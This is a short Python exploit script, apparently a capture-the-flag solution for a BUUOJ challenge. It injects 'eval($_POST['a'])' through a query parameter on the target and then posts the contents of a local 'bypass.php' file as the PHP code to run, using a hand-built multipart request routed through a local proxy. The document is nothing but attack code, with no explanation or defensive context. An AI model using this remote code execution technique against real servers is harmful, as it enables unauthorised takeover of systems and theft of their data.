import requests
import requests_toolbelt
 
url="http://f7ecabdd-c59c-4fba-9d1c-3c22894b1af5.node5.buuoj.cn:81/?exp=eval($_POST['a']);"
 
with open("bypass.php",'r') as f:
    data=f.read()
 
headers={"Content-Type":"multipart/form-data;boundary=------test"}
post_data={'a':data}
message=requests_toolbelt.MultipartEncoder(post_data,boundary='------test')
proxies={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
 
r=requests.post(url,data=message,proxies=proxies,headers=headers)

print(r.text)